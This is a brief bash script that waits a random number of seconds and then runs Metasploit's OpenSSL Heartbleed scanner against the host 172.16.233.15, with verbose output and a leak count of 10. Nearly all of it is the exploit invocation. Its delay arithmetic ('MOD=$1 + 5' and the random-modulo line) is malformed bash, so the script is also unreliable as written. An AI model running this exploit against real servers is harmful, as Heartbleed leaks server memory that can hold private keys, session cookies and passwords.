#!/bin/bash

MOD=$1 + 5

WAIT=$((1 + RANDOM) % $MOD)

sleep $WAIT

msfconsole -x "use auxiliary/scanner/ssl/openssl_heartbleed; set RHOSTS 172.16.233.15; set verbose true; set LEAK_COUNT 10; exploit"

